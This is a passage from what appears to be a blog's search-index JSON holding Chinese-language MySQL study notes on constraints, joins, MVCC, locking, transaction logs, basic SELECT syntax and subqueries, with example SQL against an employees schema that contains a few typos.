多列约束\n\n\n角度二：约束的作用范围\n列级约束：将此约束声明在对应字段的后面\n表级约束：在表中所有字段都声明完，在所有字段的后面声明的约束\n\n\n角度三：约束的作用（功能）\nnot null (非空约束)\nunique （唯一性约束）\nprimary key (主键约束)\nforeign key (外键约束)\ncheck （检查约束）\ndefualt (默认值约束)\n\n\n\n\n如何添加&#x2F;删除约束？\n\nCREATE TABLE\nALTER TABLE\n\n\n如何查看表中的约束？\nSELECT * FROM information_schema,table_constraintsWHERE table_name = &#x27;employees&#x27;;\n\n非空约束（not null）\n作用：限定某个字段&#x2F;某列的值不允许为空\n\nCREATE TABLE test1(    id INT NOT NULL,    last_name VARCHAR(15) NOT NULL,    email VARCHAR(25),    salary DECIMAL(10,2));ALTER TABLE test1MODIFY email VARCHAR(25) NOT NULL;# 删除ALTER TABLE test1MODIFY email VARCHAR(25) NULL;\n\n唯一性约束（unique）\n作用：限制某个字段&#x2F;某列的值不能重复\n\nCREATE TABLE test2(    id INT UNIQUE, #列级约束    last_name VARCHAR(15) NOT NULL,    email VARCHAR(25) UNIQUE,    salary DECIMAL(10,2),    #表级约束    CONSTRAINT uk_test2_email UNIQUE(email));#复合的唯一性约束（组合列）CREATE TABLE USER(    id INT,    name VARCHAR(15),    password VARCHAR(25),        CONSTRAINT uk_user_name_pwd UNIQUE(name,password))ALTER TABLE test2ADD CONSTRAINT uk_test2_sal UNIQUE(salary);ALTER TABLE test2MODIFY last_name VARCHAR(25) UNIQUE;\n\n\n删除唯一性约束\n添加唯一性约束上的列也会自动创建唯一索引\n删除唯一约束只能通过删除唯一索引的方式删除\n删除时需要指定唯一索引名，唯一索引名就和唯一约束名一样\n如果创建唯一约束时未指定名称，如果是单列，就默认和列名相同；如果是组合列，那么默认和（）中排在第一个的列名相同。也可以自定义唯一性约束名。\n\n\n\nALTER TABLE test2DROP INDEX last_name;\n\n主键约束（primary key）\n作用：用来唯一标识表中的一行记录\n特点：主键约束相当于“唯一约束+非空约束的组合”，不允许重复、也不允许出现空置。\n一个表中最多只能有一个主键约束\nMySQL的主键名总是 PRIMARY \n当创建主键约束时，系统默认会在所在的列或列组合上建立对应的主键索引（能够根据主键查询的，就根据主键查询，效率更高）。如果删除主键约束了，主键约束对应的索引就自动删除了。\n\nCREATE TABLE test3(    id INT PRIMARY KEY,    last_name VARCHAR(15),    email VARCHAR(25),    salary DECIMAL(10,2));CREATE TABLE test3(    id INT,    last_name VARCHAR(15),    email VARCHAR(25),    salary DECIMAL(10,2),    CONSTRAINT pk_test3_id  PRIMARY KEY(id) #没有必要起名字);#复合的主键约束（组合列）CREATE TABLE USER(    id INT,    name VARCHAR(15),    password VARCHAR(25),        PRIMARY KEY (name,password))ALTER TABLE test6ADD PRIMARY KEY(id);# 删除主键约束（实际开发中，不会去删除主键约束）ALTER TABLE test2DROP PRIMARY KEY;\n\n自增长列：AUTO_INCREMENT\n作用：某个字段的值自增\n一个表最多只能由一个自增列\n自增长列约束的列必须是键列（主键列，唯一链）\n自增约束的列数据类型必须时整数类型\n当向主键（含AUTO_INCREMENT）的字段上添加0或null，实际上会自动的往上添加\n开发中，一旦主键字段上声明有AUTO_INCREMENT，则添加数据时就不要给主键赋值\n\nCREATE TABLE test3(    id INT PRIMARY KEY AUTO_INCREMENT,    last_name VARCHAR(15),    email VARCHAR(25),    salary DECIMAL(10,2));ALTER TABLE test3MODIFY id INT AUTO_INCREMENT;ALTER TABLE test3MODIFY id INT;\n\n外键（foreign key）约束\n作用：限定某个表的某个字段的引用完整性\n特点：\n一个表中可以有多个外键约束\n从表（子表）的外键列，必须引用&#x2F;参考主表（父表）的主键或唯一约束的列。\n在创建外键约束时，如果不给外键约束命名，默认名不是列明，而是自动产生一个外键名，也可以自定义名。\n创建表时，先创建主表再创建从表\n删除表时，先删从表再删主表\n当创建外键约束时，系统默认会在所在的列上建立对应的普通索引。\n删除外键约束后，必须手动删除对应的索引。\n外键约束有成本，需要消耗系统资源，对于大并发的SQL不合适，可能会因为外键约束的系统开销而变得非常慢。（实际开发中，建议在应用层面解决外键概念）\n\n\n\nCREATE TABLE dept1(\tdept_id INT PRIMARY KEY,    dept_name VARCHAR(15));CREATE TABLE empl(    emp_id INT PRIMARY KEY AUTO_INCREMENT,    emp_name VACHAR(15),    department_id INT,        CONSTRAINT fk_emp1_dept_id FOREIGN KEY(department_id) REFERENCES dept1 (dept_id) ON UPDATE CASCADE ON DELETE SET NULL);ALTER TABLE emp2ADD ONSTRAINT fk_emp2_dept_id FOREIGN KEY(department_id) REFERENCES dept1 (dept_id)# 删除外键约束ALTER TABLE emp1DROP FOREIGN KEY fk_emp1_dept_id;# 再手动的删除外键约束对应的普通索引SHOW INDEX FROM emp1;ALTER TABLE emp1DROP INDEX fk_emp1_dept_id;\n\n约束等级\nCascade方式：在父表上update&#x2F;delete记录时，同步update&#x2F;delete掉子表的匹配记录\nSet null方式：在父表上update&#x2F;delete记录时，将子表的匹配记录的列设为null，但是要注意子表的外键列不能未not null\nNo action方式：如果子表中有匹配的记录，则不允许对附表对应候选键进行update&#x2F;delete操作\nRestrict方式：同 No action\nSet default方式：父表有变更时，子表将外键列设置成一个默认的值，但Innodb不能识别\n\n对于外键约束，最好采用ON UPDATE CASCADE ON DELETE SET NULL\n检查约束（check）\n作用：检查某个字段的值是否符合xx要求，一般值的是值的范围\n\nCREATE TABLE test3(    id INT PRIMARY KEY AUTO_INCREMENT,    last_name VARCHAR(15),    email VARCHAR(25),    salary DECIMAL(10,2) CHECK(salary &gt; 2000));\n\n默认值约束（defualt)\n作用：给某个字段指定默认值\n\nCREATE TABLE test3(    id INT PRIMARY KEY AUTO_INCREMENT,    last_name VARCHAR(15),    email VARCHAR(25),    salary DECIMAL(10,2) DEFAULT 2000);ALTER TABLE test3MODIFY salary DECIMAL(10,2) DEFAULT 2500;ALTER TABLE test3MODIFY salary DECIMAL(10,2);\n\n面试题：\n\n为什么不想要null值？\n不好比较。null碰到运算符通常返回null\n效率不高。影响提高索引效果，因此建表时通常not null default ‘’ 或 default 0\n\n\n\n","categories":["MySQL"],"tags":["约束"]},{"title":"MySQL（三）：多表查询","url":"/2023/02/08/MySQL%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E5%A4%9A%E8%A1%A8%E6%9F%A5%E8%AF%A2/","content":"为什么需要多表查询\n减少冗余\n提高网络IO效率\n当多并发时便于维护\n\n# 错误的实现方式：出现笛卡尔积# 每个员工都和每个部门都匹配了一遍SELECT employee_id,department_nameFROM employees,department;# 正确的实现方式SELECT employee_id,department_nameFROM employees,departmentWHERE employees.department_id = department.department_id# 如果查询语句中出现了多个表中都存在的字段，则必须指明此字段所在的表# 从sql优化的角度，建议多表查询时，每个字段前都指明其所在的表SELECT employee_id,department_name,employees.department_idFROM employees,departmentWHERE employees.department_id = department.department_id# 可以给表起别名，在SELECT和WHERE中使用表的别名# 如果给表起了别名，则必须使用表的别名，不能再使用表的原名SELECT emp.employee_id,dept.department_name,emp.department_idFROM employees emp,department deptWHERE emp.department_id = dept.department\n\n多表查询的分类\n角度1：\n\n等值连接 vs 非等值连接\n前面举的例都是等值连接\n# 非等值连接的例子SELECT e.last_name,e.salary,j.grade_levelFROM employees e,job_grades jWHERE e.salary BETWEEN j.lowest_sal AND j.hightest_sal;\n\n\n角度2：\n\n自连接 vs 非自连接\n前面举的例都是非自连接\n# 自连接的例子# 查询员工id和姓名 及其 管理者的id和姓名SELECT emp.employee_id,emp.last_name,mgr.employee_id,mgr.last_nameFROM employees emp, employees mgrWHERE emp.manager_id = mgr.employee_id;\n\n\n角度3：\n\n内连接 vs 外连接\n前面举的例都是内连接\n\n内连接：合并具有同一列的两个以上的表的行，结果集中不包含一个表与另一个表不匹配的行\n\n# 内连接：# SQL92语法实现内连接SELECT last_name,department_nameFROM employees,departmentWHERE employees.department_id = department.department_id;# SQL99语法实现内连接SELECT last_name,department_name,cityFROM employees e INNER JOIN departments dON e.department_id = d.department_idJOIN locations lON d.location_id = l.location_id\n\n\n外连接：合并具有同一列的两个以上的表的行，结果集中除了包含一个表与另一个表匹配的行之外，还查询到了左表 或 右表中不匹配的行\n\n# 外连接：查询所有的员工的last_name,department_name信息# SQL92语法实现外连接：使用 +  (MySQL不适用)SELECT last_name,department_nameFROM employees,departmentWHERE employees.department_id = department.department_id(+);# SQL99语法实现左外连接 (把没有部门的员工也查询出来)SELECT last_name,department_name,cityFROM employees LEFT OUTER JOIN departments dON e.department_id = d.department_id;# SQL99语法实现右外连接 (把没有员工的部门也查询出来)SELECT last_name,department_name,cityFROM employees RIGHT OUTER JOIN departments dON e.department_id = d.department_id;# SQL99语法实现满外连接 (把没有部门的员工、没有员工的部门也查询出来)（MySQL不支持FULL OUTER JOIN）SELECT last_name,department_name,cityFROM employees FULL OUTER JOIN departments dON e.department_id = d.department_id;\n\n外连接的分类：\n\n左外连接、右外连接、满外连接\n\n\n\n\n\n7种JOIN操作\nUNION和UNION ALL\nUNION：会执行去重操作\nUNION ALL：不会执行去重操作\n结论：如果明确知道和合并数据后的结果数据不存在重复的数据，或者不需要去除重复的数据，则尽量使用UNION ALL语句，以太高数据查询的效率。\n\n中图：内连接\nA：employees表\nB：departments表\n\nSELECT employee_id,department_nameFROM employees e JOIN departments dON e.department_id = d.department_id;\n\n左上图：左外连接SELECT employee_id,department_nameFROM employees e LEFT JOIN departments dON e.department_id = d.department_id;\n\n右上图：右外连接SELECT employee_id,department_nameFROM employees e RIGHT JOIN departments dON e.department_id = d.department_id;\n\n左中图：SELECT employee_id,department_nameFROM employees e LEFT JOIN departments dON e.department_id = d.department_idWHERE d.department_id IS NULL;\n\n右中图：SELECT employee_id,department_nameFROM employees e RIGHT JOIN departments dON e.department_id = d.department_idWHERE e.department_id IS NULL;\n\n\n\n左下图：满外连接# 方式1：左上图 UNION ALL 右中图SELECT employee_id,department_nameFROM employees e RIGHT JOIN departments dON e.department_id = d.department_id;UNION ALLSELECT employee_id,department_nameFROM employees e RIGHT JOIN departments dON e.department_id = d.department_idWHERE e.department_id IS NULL;# 方式1：左中图 UNION ALL 右上图SELECT employee_id,department_nameFROM employees e LEFT JOIN departments dON e.department_id = d.department_idWHERE d.department_id IS NULL;UNION ALLSELECT employee_id,department_nameFROM employees e RIGHT JOIN departments dON e.department_id = d.department_id;\n\n右下图：# 左中图 UNION ALL 右中图SELECT employee_id,department_nameFROM employees e LEFT JOIN departments dON e.department_id = d.department_idWHERE d.department_id IS NULL;UNION ALLSELECT employee_id,department_nameFROM employees e RIGHT JOIN departments dON e.department_id = d.department_idWHERE e.department_id IS NULL;\n\n\n\nSQL99语法新特性NATURE JOIN（自然连接）自动帮你查询两张连接表中 所有相同的字段 然后进行等值连接\nSELECT employee_id,department_nameFROM employees e NATURE JOIN departments d;\n\nUSINGSELECT employee_id,department_nameFROM employees e JOIN departments dON e.department_id = d.department_id;SELECT employee_id,department_nameFROM employees e JOIN departments dUSING (department_id);\n\n","categories":["MySQL"],"tags":["多表查询"]},{"title":"MySQL（九）：存储过程与存储函数","url":"/2023/02/09/MySQL%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9A%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%AD%98%E5%82%A8%E5%87%BD%E6%95%B0/","content":"存储过程\n存储过程（Stored Procedure）：就是一组经过预先编译的SQL语句的封装\n\n\n\n存储函数\n用户自定义的函数。\n\n存储函数和存储过程区别：存储函数有返回值，存储过程没有返回值\n\n\n\n","categories":["MySQL"],"tags":["存储过程与存储函数"]},{"title":"MySQL（二十二）：多版本并发控制","url":"/2023/02/14/MySQL%EF%BC%88%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/","content":"\nMVCC（Multiversion Concurrency Control），多版本并发控制。\nMVCC时通过数据行的多个版本管理来实现数据库的并发控制，这项技术使得再InnoDB的事务隔离级别下执行一致性读操作有了保证。换言之，就说为了查询一些正在被另一个事务更新的行，并且可以看到它们被更新之前的值，这样在做查询的时候就不用等待另一个事务释放锁。\n\n快照读和当前读MVCC用更好的方式去处理读-写冲突，做到即使有读写冲突时，也能做到不加锁，非阻塞并发读，而这个读指的就是快照读，而非当前读。当前读实际上是一种加锁的操作，是悲观锁的实现。而MVCC本质是采用乐观锁思想的一种方式。\n快照读又叫一致性读，读取的是快照数据。不加锁的简单的SELECT都属于快照读，即不加锁的非阻塞读。\n快照读可能读到的并不一定是数据的最新版本，有可能是之前的历史版本。\n当前读读取的是记录的最新版本（最新数据，而不是历史版本的数据），读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行加锁。加锁的SELECT ,或者对数据进行增删改查都会进行当前读。\n\nMVCC实现原理之ReadView\nMVCC的实现依赖于：隐藏字段、Undo Log、Read View\n\nRead View就是某个事务使用MVCC机制进行快照读操作时产生的读视图。当事务启动时，会生成数据库系统当前的一个快照，InnoDB为每个事务构造了一个数组，用来记录并维护系统当前活跃事务的ID。\nMVCC整体操作流程当查询一条记录的时候，系统通过MVCC找到它：\n\n首先获取事务自己的版本号，也就是事务ID\n获取ReadView\n查询得到的数据，然后于Read View中的事务版本号进行比较\n如果不符合Read View规则，就需要从Undo Log中获取历史快照\n最后返回符合规则的数据\n\n如果某个版本的数据对当前事务不可见的话，那就顺着版本链找到一个版本的数据，继续按照上面的步骤判断可见性，依此类推，直到版本链中的最后一个版本。如果最后一个版本也不可见的话，那么即意味着该条记录对该事务完全不可见，查询结果就不包含该记录。\n\nInnoDB中，MVCC是通过Undo Log+Read View进行读取数据，Undo Log保存了历史快照，而Read View规则帮助我们判断当前版本的数据是否可见。\n\n\n总结\nMVCC只有在READ COMMITTED、REPEATABLE READ这两种隔离级别的事务有效。\nREAD COMMITTED、REPEATABLE READ这两个隔离机械生成ReadView的时机不同：\nREAD COMMITTED在每一次进行普通SELECT操作之前都会生成一个Read View\nREPEATABLE READ只在第一次进行普通SELECT操作之前生成一个Read View，之后的查询操作都重复使用这个Read View\n\n\n\n\n\n","categories":["MySQL"],"tags":["MVCC"]},{"title":"MySQL（二十一）：锁","url":"/2023/02/14/MySQL%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9A%E9%94%81/","content":"\n事务的隔离性由锁机制实现。\n\nMySQL并发事务访问相同记录读-读情况读取操作本身不会对记录由任何影响，并不会引起什么问题，所以允许这种情况发生。\n写-写情况这种情况下会发生脏写问题，任何一种可理解别都不允许这种问题的发生。所以在多个未提交事务相继对一条记录做改动时，需要让它们排队执行，这个排队过程是通过锁来实现的。\n\n读-写或写-读情况这种情况下可能会发生脏读、不可重复读、幻读的问题。\n并发问题的解决方案主要指的是解决脏读、不可重复读、幻读的问题。\n\n方案一：读操作利用多版本并发控制（MVCC），写操作进行枷锁\n方案二：读、写操作都进行加锁。\n对比：\n采用MVCC方式，读-写操作彼此并不冲突，性能更高。\n采用加锁方式，读-写操作彼此需要排队执行，影响性能。\n\n\n\n锁的不同角度分类按数据的操作类型划分按数据的操作类型划分：读锁 &#x2F; 共享锁、写锁 &#x2F; 排他锁\n\n读锁 &#x2F; 共享锁（Shared Lock，S Lock）：针对同一份数据，多个事务的读操作可以同时进行而不会相互影响，相互不阻塞。\n写锁 &#x2F; 排他锁（Exclusive Lock，X Lock）：当前写操作没有完成前，它会阻断其它写锁和读锁。\n\n对于InnoDB引擎来说，读锁和写锁可以加在表上，也可以加在行上。\n\n\n\n\nX锁\nS锁\n\n\n\nX锁\n不兼容\n不兼容\n\n\nS锁\n不兼容\n兼容\n\n\n锁定读\n对读取的记录加S锁\nSELECT ... LOCK IN SHARE MODE;# 或SELECT ... FOR SHARE;\n\n对读取的记录加X锁\nSELECT ... FOR UPDATE;\n\n写操作一定是排他锁（X锁）\n\n按数据操作粒度划分按数据操作粒度划分：表级锁、页级锁、行锁\n表锁（Table Lock）开销小，并发性差\n\n表级别的S锁、X锁MyISAM在执行查询语句（SELECT）前，会给设计的所有表加读锁，在执行增删改操作前，会给设计的表加写锁。\nInnoDB存储引擎是不会为这个表添加表级别的读锁或写锁的。 \n\n意向锁（intention lock）InnoDB支持多粒度锁，它允许行级锁与表级锁共存，而意向锁就是其中的一种表锁。\n意向锁要解决的问题：如果我们给某一行数据加上了排他锁，数据库会自动给更大一级的空间，比如数据页或数据表加上意向锁，告诉其他人这个数据页或数据表已经有人上过排他锁了。（这样他人想要获取数据表排他锁的适合，只需要了解是否有人已经获取了这个数据表的意向排他锁即可，而不需要遍历每行数据）\n\n如果事务想要获得数据表中某些记录的共享锁，（自动）就需要在数据表上添加意向共享锁（IS）。\n如果事务想要获得数据表中某些记录的排他锁，（自动）就需要在数据表上添加意向排他锁（IX）。\n\n\n\n自增锁（AUTO-INC锁）AUTO-INC锁是当向使用含有AUTO_INCREAMENT列的表中插入数据时需要获取的一种特殊的表级锁。\n一个事务在持有AUTO-INC锁的过程中，其他事务的插入语句都要被阻塞。\n当向一个有AUTO_INCREAMENT关键字的主键插入值的适合，每条语句都要对这个表锁进行竞争。\n\n元数据锁（matadata lock,MDL锁）解决的问题：如果一个查询正在遍历一个表中的数据，而执行期间另一个线程对这个表结构做变更，增加了一列，那么查询线程拿到的结果跟表结构对不上。\n\n当对一个表做增删改查操作的时候，加MDL读锁。\n当对一个表做结构变更操作的时候，加MDL写锁。\n\n不需要显式使用，数据库会自动添加。\n\n\nInnoDB中的行锁\n优点：锁定粒度小，法伤锁冲突概率低，可以实现的并发度高\n缺点：对于锁的开销比较大，加锁会比较慢，容易出现死锁情况。\n\n\n记录锁（Record Locks）就是仅仅把一条记录锁上。\n\n间隙锁（Gap Locks）gap锁仅仅是为了防止插入幻影记录而提出的。\n用于阻止其他事务在某两个记录之间的间隙插入新记录。\n间隙锁有可能导致死锁\n\n临键锁（Next-Key Locks）临键锁相当于记录锁+间隙锁。\n\n插入意向锁（Insert Intention Locks）InnoDB规定事务在等待的时候也需要在内存中生成一个锁结构，表明有事务想在某个间隙中插入新记录，但是现在在等待。\n\n\n\n页锁页锁的开销介于表锁和行锁之间，会出现死锁。锁定粒度介于表锁和行锁之间，并发度一般。\n按对待锁的态度划分按对待锁的态度划分：悲观锁、乐观锁。是两种看待数据并发的思维方式，并不是锁，而是锁的设计思想。\n悲观锁（Pessimistic Locking）对数据被其他事务的修改持保守态度，会通过数据库自身的锁机制来实现，从而保证数据操作的排他性。\n共享资源每次只给一个线程使用，其他线程阻塞，用完后再把找资源转让给其他线程。例如Java中synchronized和ReentrantLock等独占锁就是悲观锁思想的实现。\n悲观锁不适用的场景较多，对于高并发、长事务的场景，考虑使用乐观锁。\n乐观锁（Optimistic Locking）乐观锁认为对同一数据的并发操作不会总发生，属于小概率事件，不用每次都对数据上锁，但是再更新的时候会判断一下在此期间别人有没有区更新这个数据，也就是不采用数据库自身的锁机制，而是通过程序来实现。\n在程序上，我们可以采用版本号机制或者CAS机制实现，乐观锁使用于多读的应用类型，可以提高吞吐量。在Java中java.util.concurrent.atomic包下的原子变量类就是使用了乐观锁的一种实现方式：CAS实现的。\n两种锁的使用场景\n按加锁方式划分按加锁方式划分：显式锁、隐式锁\n隐式锁一个事务对新插入的记录可以不显式的加锁（生成一个锁结构），但是由于事务id的存在，相当于加了一个隐式锁。别的事物在对这条记录加S锁或者X锁时，由于隐式锁的存在，会先帮助当前事务生成一个锁结构，然后自己再生成一个锁结构后进入等待状态。\n隐式锁是一种延迟加锁的机制，从而来减少加锁的数量。\n隐式锁再实际内存对象中并不含有这个锁信息，只有当产生锁等待时，隐式锁转化为显式锁。\n显式锁通过特定的语句进行加锁，称之为显式加锁。可以用SELECT * FROM performance_schema.data_lock_waits 查到的锁。\n其它锁全局锁对整个数据库实例进行加锁。\n使用场景：全库逻辑备份。\nFlush tables with read lock;\n\n死锁概念：两个事务都持有对方需要的锁，并且再等待对方释放，并且双方都不会释放自己的锁。\n产生死锁的必要条件：\n\n两个或两个以上事务\n每个事务都已经持有锁并且申请新的锁\n锁资源同时只能被同一个事物持有或者不兼容\n事物之间因为持有锁和申请锁导致彼此循环等待\n\n\n死锁的关键在于：两个（或以上）的Session加锁的顺序不一致。\n\n如何处理死锁？\n方式1：等待，直到超时\n当一个事物等待事件超过设置的阈值时，就将其回滚。\n\n方式2：使用死锁检测进行死锁处理\ninnodb提供的wait-for graph算法来主动进行死锁检测。\n\n\n锁的内存结构\n锁监控\nshow status like &#39;innodb_row_lock%&#39;\n\n","categories":["MySQL"],"tags":["锁"]},{"title":"MySQL（二十）：MySQL事务日志","url":"/2023/02/12/MySQL%EF%BC%88%E4%BA%8C%E5%8D%81%EF%BC%89%EF%BC%9AMySQL%E4%BA%8B%E5%8A%A1%E6%97%A5%E5%BF%97/","content":"\n事务的隔离性由锁机制实现。\n而事务的原子性、一致性、持久性由事务的redo日志和undo日志保证。\n\n\nREDO LOG 称为 重做日志，提供再写入操作，恢复提交事务修改的页操作，用来保证事务的持久性。【保证提交状态】\n是存储引擎层（innodb）生成的日志，记录的是物理级别上的页修改操作，比如页号、偏移量、写入了xxx数据。\n\nUNDO LOG称为回滚日志，回滚行记录到某个特定版本，来保证事务的原子性、一致性。【保证中止状态】\n是存储引擎层（innodb）生成的日志，记录的是逻辑操作日志，比如对某一行数据进行了INSERT语句操作，那么undo log就记录一条与之相反的DELETE操作。主要用于事务的回滚（undo log 记录的是每个操作的逆操作）和一致性非锁定读（undo log回滚行记录到某种特定版本…MVCC，即多版本并发控制）。\n\n\nredo日志redo日志的组成\n重做日志的缓冲（redo log buffer)，保存在内存中，是易失的。\n重做日志文件（redo log file），保存在硬盘中，是持久的。\n\nredo的整体流程\nWrite Ahead Log（预先日志持久化）：在持久化一个数据页之前，先将内存中相应的日志页持久化。\nredo log的刷盘策略一旦日志页持久化，便能保证数据页持久化。\n此时的刷盘：将内存中相应的日志页持久化\n\nundo日志在事务中更新数据的前置操作其实是要先写入一个undo log。\nundo日志的作用\n回滚数据：将数据库逻辑地恢复到原来的样子，而非物理地恢复。\nMVCC：当用户读取一行记录时，若该记录已经被其它事务占用，当前事务可以通过undo读取之前的行版本信息，以此实现非锁定读取。\n\n","categories":["MySQL"],"tags":["事务日志"]},{"title":"MySQL（二）：SQL语句基础","url":"/2023/02/08/MySQL%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9ASQL%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80/","content":"SQL的分类\nDDL：数据定义语言。（对结构）\nCREATE、ALTER、DROP、RENAME、TRUNCATE\n补充：DDL的操作一旦执行，就不可回滚。\n\n\nDML：数据操作语言。（对数据）\n增删改查：INSERT、DELETE、UPDATE、SELECT\n补充：DML的操作默认清空，一旦执行，也是不可回滚的；但是如果在执行DML之前，执行了SET autocommit = FALSE,则执行的DML操作就可以实现回滚\n\n\nDCL：数据控制语言。\nCOMMIT、ROLLBACK、SAVEPOINT、GRANT、REVOKE\n\n\n\n导入现有的数据表、表的数据\n方式1：命令行：source 文件的全路径名‘\nsource d:\\atguigudb.sql\n\n方式2：基于具体的图形化界面的工具可以导入数据\n\n\n基本的SELECT语句\n格式：SELECT 字段1,字段2,... From 表名\n*：表中所有的字段（列）\n\n列的别名\nAS：alias别名，可以省略\n格式：SELECT 字段1 别名1,字段2 AS 别名2,字段3 &quot;别名3&quot;... From 表名\n\n去除重复行#未去重SELECT department_id FROM employees;#去重SELECT DISTINCT department_id FROM employees;#错误的SELECT salary,DISTINCT department_id FROM employees;#仅仅没有报错，但是没有实际意义SELECT DISTINCT salary, department_id FROM employees;\n\n空值参与运算\n空值：null\nnull并不等同于0，’’，’null’\n空值参与运算：结果一定也为空NULL\n\n着重号\n着重号 &#96;&#96;\n表名和关键词重合时用\n\nSELECT * FROM `ORDER`\n\n查询常数SELECT &quot;尚硅谷&quot;, employe_id, department_id FROM employees;\n\n显示表结构显示了表中字段的详细信息\nDESCRIBE employees;DESC employees;\n\nWHERE过滤数据声明在FROM结构的后面\nSELECT *FROM employeesWHERE department_id = 90;\n\nSELECT *FROM employeesWHERE last_name = &#x27;King&#x27;;\n\n\nSQL在windows下，对于关键字不区分大小写，对于’’包裹的字符串大小写敏感。但MySQL不严谨，都不区分大小写；Oracle严谨。\n\n类的别名只能在order by中使用，不但能在where中使用。\n因为先执行from…where……再执行select，此时还没有别名\n\n\n运算算数运算符\n+ - * / div % mod（&#x2F;和div为除，%和mod为取模）\n\n&#96;&#96;&#96;mysql#在sql中，+没有连接作用，就表示加法运算。SELECT 100 + ‘1’FROM DUAL; #101\nSELECT 100 + ‘a’ #此时将a看作0处理FROM DUAL; \nSELECT 100 + NULL #null值参与运算，结果位nullFROM DUAL;\n## 比较运算符1.  `= &lt;=&gt; &lt;&gt; != &lt; &lt;= &gt; &gt;=`   - `&lt;=&gt;`：安全等于，可以对NULL进行判断     在两个操作数均为NULL时，返回1，而不为NULL；当一个操作数为NULL时，返回0，而不为NULL。     ```mysql     #查询不出     SELECT last_name,salary     FROM employees     WHERE commission_pct = NULL;     #查询得出     SELECT last_name,salary     FROM employees     WHERE commission_pct &lt;=&gt; NULL;\n\n\n&lt;&gt; !=：不等于\n\n\n\n\n\nSELECT last_name,salaryFROM employeesWHERE commission_pct IS NULL;SELECT last_name,salaryFROM employeesWHERE commission_pct IS NOT NULL;SELECT last_name,salaryFROM employeesWHERE ISNULL(commission_pct);\n\nSELECT LEAST(&#x27;g&#x27;,&#x27;b&#x27;,&#x27;t&#x27;,&#x27;m&#x27;),GREATEST(&#x27;g&#x27;,&#x27;b&#x27;,&#x27;t&#x27;,&#x27;m&#x27;)FROM DUAL;SELECT LEAST(first_name,last_name)FROM employees;\n\n# BETWEEN 条件1 AND 条件2 (包含边界)SELECT last_name,salaryFROM employeesWHERE salary BETWEEN 6000 AND 8000;SELECT last_name,salaryFROM employeesWHERE salary NOT BETWEEN 6000 AND 8000;\n\nSELECT last_name,salaryFROM employeesWHERE department_id IN (10,20,30);SELECT last_name,salaryFROM employeesWHERE department_id NOT IN (10,20,30);\n\n#LIKE:模糊查询# % :代表不确定个数的字符SELECT last_nameFROM employeesWHERE last_name LIKE &#x27;%a%&#x27;;SELECT last_nameFROM employeesWHERE last_name LIKE &#x27;%a%e%&#x27; OR last_name LIKE &#x27;%e%a%&#x27;;# _ :代表一个不确定的字符# 查询第二个字符是a的SELECT last_nameFROM employeesWHERE last_name LIKE &#x27;_a%&#x27;;# 查询第二个字符是_且第三个字符是a的# 转义字符SELECT last_nameFROM employeesWHERE last_name LIKE &#x27;_\\_a%&#x27;;\n\n\nSELECT &#x27;shstart&#x27; REGEXP &#x27;^shk&#x27;,&#x27;shstart&#x27; REGEXP &#x27;t$&#x27;,&#x27;shstart&#x27; REGEXP &#x27;hk&#x27;FROM DUAL;SELECT &#x27;atguigu&#x27; REGEXP &#x27;gu.gu&#x27;,&#x27;atguigu&#x27; REGEXP &#x27;[ab]&#x27;FROM DUAL;\n\n逻辑运算符\n# XOR: 追求&quot;异&quot;SELECT last_name,salaryFROM employeesWHERE department_id = 50 XOR salary &gt; 6000;\n\n位运算符\n排序\n如果没有使用排序操作，默认情况下查询返回的数据是按照添加数据的顺序显示\n升序：ASC（ascend）\n降序：DESC(descend)\n\nSELECT employee_id,last_name,salaryFROM employeesORDER BY salary;  #默认升序排列SELECT employee_id,last_name,salaryFROM employeesORDER BY salary DESC;#使用类的别名进行排序SELECT employee_id,salary,salary * 12 aunnual_salFROM employeesORDER BY aunnual_sal;#二级排序SELECT employee_id,salary,department_idFROM employeesORDER BY department_id DESC,salary ASC;\n\n分页\n使用limit实现数据的分页显示\n需求：每页显示pageSize条记录，此时显示第pageNo页LIMIT (pageNo-1)*pageSize,pageSize\nLIMIT语句必须放在最后\n\n#需求：每页显示20条记录，此时显示第1页SELECT employee_id,salary,department_idFROM employeesLIMIT 0,20;#需求：每页显示20条记录，此时显示第2页SELECT employee_id,salary,department_idFROM employeesLIMIT 20,20;# WHERE ORDER BY LIMIT的顺序SELECT employee_id,salary,department_idFROM employeesWHERE salary &gt; 6000ORDER BY salary DESCLIMIT 10;\n\n","categories":["MySQL"],"tags":["SQL语句基础"]},{"title":"MySQL（五）：子查询","url":"/2023/02/08/MySQL%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E5%AD%90%E6%9F%A5%E8%AF%A2/","content":"子查询的分类SELECT last_name,salaryFROM employeesWHERE salary &gt; (    SELECT salary    FROM employees    WHERE last_name = &#x27;Abel&#x27;);\n\n\n称谓的规范：外查询（或主查询）、内查询（子查询）\n分类：\n角度一：内查询返回结果的条目数\n单行子查询 vs 多行子查询\n\n\n角度二：内查询是否被执行多次\n相关子查询 vs 不相关子查询\n相关子查询：查询工资大于本部门平均工资的员工信息\n\n\n\n\n\n单行子查询\n单行比较操作符：&#x3D; !&#x3D; &gt; &gt;&#x3D; &lt; &lt;&#x3D;\n\nSELECT last_name,job_id,salaryFROM employeesWHERE job_id = (                SELECT job_id                FROM employees                WHERE employee_id = 141                ) AND salary &gt; (                SELECT salary                FROM employees                WHERE employee_id = 143                );\n\n多行子查询\n多行比较操作符：IN ANY ALL SOME\n\n\nSELECT employee_id, last_nameFROM employeesWHERE salary IN (    SELECT MIN(salary)    FROM employees    GROUP BY department_id);SELECT employee_id,last_name,job_id,salaryFROM employeesWHERE job_id &lt;&gt; &#x27;IT_PROG&#x27;AND salary &lt; ANY (    SELECT salary    FROM employees    WHERE job_id = &#x27;IT_PROG&#x27;);SELECT employee_id,last_name,job_id,salaryFROM employeesWHERE job_id &lt;&gt; &#x27;IT_PROG&#x27;AND salary &lt; ALL (    SELECT salary    FROM employees    WHERE job_id = 